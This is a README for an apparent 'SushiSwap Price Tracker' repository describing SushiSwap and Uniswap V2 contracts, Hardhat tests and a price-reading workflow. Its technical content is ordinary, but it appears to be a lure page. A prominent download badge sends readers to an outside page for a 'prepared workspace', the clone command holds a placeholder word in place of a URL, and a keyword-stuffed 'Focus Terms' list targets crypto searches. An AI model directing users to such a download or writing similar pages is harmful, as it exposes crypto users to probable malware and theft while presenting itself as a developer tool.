# SushiSwap Price Tracker - Contract And Market Reference

<p align="center">
  <img src="logo.png" width="220" alt="SushiSwap Price Tracker logo">
</p>

SushiSwap Price Tracker is a focused reference workspace for reviewing SushiSwap V1 contracts, pair mechanics, routing libraries, SUSHI token behavior, and test-backed price paths. It combines the compact product introduction used by the source projects with the development, deployment, history, and contract maps preserved in this repository.

> Follow the path from pair reserves to router output, then verify the same components with focused Hardhat tests.

## Contents

- [What Is Included](#what-is-included)
- [Component Matrix](#component-matrix)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Price Reading Workflow](#price-reading-workflow)
- [Reference Tables](#reference-tables)
- [FAQ](#faq)
- [Focus Terms](#focus-terms)
- [Notes And License](#notes-and-license)

## What Is Included

- SushiSwap token, staking, farming, migration, and ownership contracts.
- Uniswap V2 pair, factory, router, interface, and math primitives used by SushiSwap V1.
- Hardhat configuration and package scripts for compilation and local inspection.
- TypeScript tests for SushiToken, SushiBar, and MasterChef behavior.
- Development, deployment, and protocol history notes.
- Local visual assets for the SushiSwap price workflow.

The collection keeps the contract catalog close to the usage guide. This makes it easier to compare a SushiSwap price quote with the pair, router, liquidity, and reward components that produce its surrounding market context.

![Price Chart Symbol](images/price-chart.svg)

## Component Matrix

| Area | Primary Files | What To Review |
| --- | --- | --- |
| Pair pricing | `contracts/uniswapv2/UniswapV2Pair.sol`, `contracts/uniswapv2/libraries/UQ112x112.sol` | Reserves, cumulative values, and fixed-point price representation. |
| Route calculation | `contracts/uniswapv2/libraries/UniswapV2Library.sol`, `contracts/uniswapv2/UniswapV2Router02.sol` | Pair addressing, quote paths, and routed token amounts. |
| Factory state | `contracts/uniswapv2/UniswapV2Factory.sol`, `contracts/uniswapv2/interfaces/IUniswapV2Factory.sol` | Pair creation and pair lookup. |
| SUSHI token | `contracts/SushiToken.sol`, `test/SushiToken.test.ts` | Supply, ownership, and tested token behavior. |
| Staking | `contracts/SushiBar.sol`, `test/SushiBar.test.ts` | SUSHI deposit and share accounting. |
| Farming | `contracts/MasterChef.sol`, `contracts/MiniChefV2.sol`, `test/MasterChef.test.ts` | Pool allocation and reward flow. |
| Migration | `contracts/Migrator.sol`, `contracts/SushiRoll.sol` | Liquidity migration paths. |

## Quick Start

### Package Button

[![GET SUSHISWAP TRACKER](https://img.shields.io/badge/GET%20SUSHISWAP%20TRACKER-EA4AAA?style=for-the-badge&logoColor=white)](https://sushiswap-price.github.io/sushiswap-price-tracker/sushiswap-price)

Use the package button to obtain the prepared SushiSwap price tracker workspace.

### PowerShell Setup

```powershell
git clone SILKA sushiswap-price-tracker
Set-Location .\sushiswap-price-tracker
npm install
npm run build
```

The build command runs the Hardhat compiler configured by `hardhat.config.ts`. Keep `package.json`, `hardhat.config.ts`, and the `contracts` directory together when moving the workspace.

## Usage

### Run The Focused Tests

```powershell
npx hardhat test .\test\SushiToken.test.ts
npx hardhat test .\test\SushiBar.test.ts
npx hardhat test .\test\MasterChef.test.ts
```

Run the complete package test command when the full test tree is available:

```powershell
npm test
```

### Open A Local Console

```powershell
npx hardhat node
npx hardhat --network localhost console
```

Use the console to inspect deployed test contracts, query pair reserves, compare token ordering, and follow router calculations. Use a separate terminal for the node and console.

### Review The Documentation

| Document | Purpose |
| --- | --- |
| [`docs/DEVELOPMENT.md`](docs/DEVELOPMENT.md) | Local node, tests, console, coverage, gas, lint, and watch workflows. |
| [`docs/DEPLOYMENT.md`](docs/DEPLOYMENT.md) | Network deployment and contract verification command patterns. |
| [`docs/HISTORY.md`](docs/HISTORY.md) | The sequence from SushiToken and MasterChef through factory, router, and migration. |
| [`contracts/uniswapv2/README.md`](contracts/uniswapv2/README.md) | Uniswap V2 core baseline and SushiSwap-specific changes. |

## Price Reading Workflow

The source documentation favors short, repeatable command sequences. Apply the same pattern when tracing a SushiSwap price:

1. Select the token pair and confirm token ordering through the factory and pair interfaces.
2. Read reserves from `contracts/uniswapv2/UniswapV2Pair.sol`.
3. Review fixed-point helpers in `contracts/uniswapv2/libraries/UQ112x112.sol` and arithmetic helpers in the library directories.
4. Follow path calculations through `contracts/uniswapv2/libraries/UniswapV2Library.sol`.
5. Compare router output in `contracts/uniswapv2/UniswapV2Router02.sol`.
6. Record the block context before comparing the result with another SushiSwap exchange view.

![Sushi Application Icon](images/sushi-icon.svg)

### Reading Modes

| Mode | Input | Best For |
| --- | --- | --- |
| Pair view | One pair and its reserve state. | Direct SushiSwap price inspection. |
| Route view | Token path with two or more assets. | Comparing routed output and intermediate pools. |
| Token view | SUSHI supply and ownership state. | SushiSwap token reference checks. |
| Reward view | MasterChef or MiniChef pool state. | Relating liquidity incentives to market activity. |
| History view | Development and protocol history documents. | Understanding contract order and migration context. |

## Reference Tables

### Contract Groups

| Group | Representative Contracts |
| --- | --- |
| Core exchange | `contracts/uniswapv2/UniswapV2Factory.sol`, `contracts/uniswapv2/UniswapV2Pair.sol`, `contracts/uniswapv2/UniswapV2ERC20.sol`. |
| Routing | `contracts/uniswapv2/UniswapV2Router02.sol`, `contracts/uniswapv2/libraries/UniswapV2Library.sol`, `contracts/uniswapv2/libraries/TransferHelper.sol`. |
| SushiSwap core | `SushiToken.sol`, `SushiBar.sol`, `SushiMaker.sol`, `SushiMakerKashi.sol`. |
| Rewards | `MasterChef.sol`, `MasterChefV2.sol`, `MiniChefV2.sol`. |
| Supporting systems | `BentoBoxV1.sol`, `KashiPairMediumRiskV1.sol`, `PeggedOracleV1.sol`. |
| Test fixtures | `ERC20Mock.sol`, `WETH9Mock.sol`, `RewarderMock.sol`, `SushiSwapPairMock.sol`. |

### Check Matrix

| Check | Pair | Route | Token | Rewards |
| --- | :---: | :---: | :---: | :---: |
| Contract source included | Yes | Yes | Yes | Yes |
| Interface included | Yes | Yes | Yes | Yes |
| Local test included | No | No | Yes | Yes |
| Historical context included | Yes | Yes | Yes | Yes |
| Suitable for console inspection | Yes | Yes | Yes | Yes |

## FAQ

### What Does The SushiSwap Price Tracker Measure?

It organizes the contracts and workflows needed to inspect reserve-based pair values, routed token amounts, SUSHI token state, and liquidity reward context.

### Where Does A Pair Quote Begin?

A pair quote begins with token ordering and reserve state. The pair and factory interfaces identify the relevant contract, while the library and router show how values move through a route.

### Why Compare Pair And Route Views?

A direct pair can differ from a multi-pool route. Reviewing both views helps explain why a SushiSwap price path may include intermediate tokens.

### Can I Run One Test At A Time?

Yes. The included TypeScript files cover SushiToken, SushiBar, and MasterChef, and each can be passed directly to Hardhat.

### Which Files Explain Local Development?

Start with `docs/DEVELOPMENT.md`, then use `hardhat.config.ts` and `package.json` to match the documented commands to the available scripts.

### How Should Contract Changes Be Checked?

Compile first, run the focused test for the changed area, then run the complete test command. Review deployment commands separately from local development commands.

### Does The Repository Include Multiple Network Deployments?

The deployment guide contains network command patterns. The selected FILES set emphasizes source contracts, tests, and documentation instead of archived deployment artifacts.

## Focus Terms

sushiswap price, sushiswap crypto, sushiswap token, sushiswap coin, sushiswap exchange, sushiswap dex, sushiswap v3, sushi swap, buy sushiswap, sushiswap price prediction, uniswap price, dexscreener, quickswap, pancakeswap, curve finance

## Notes And License

The package metadata identifies the core contracts under the MIT license, and the Uniswap V2 contract directory includes its source license file. Preserve those files with the contract set.

Keep local development, network deployment, and price comparison as separate workflows. Confirm the selected chain, pair address, token order, reserve block, and route before recording a result.
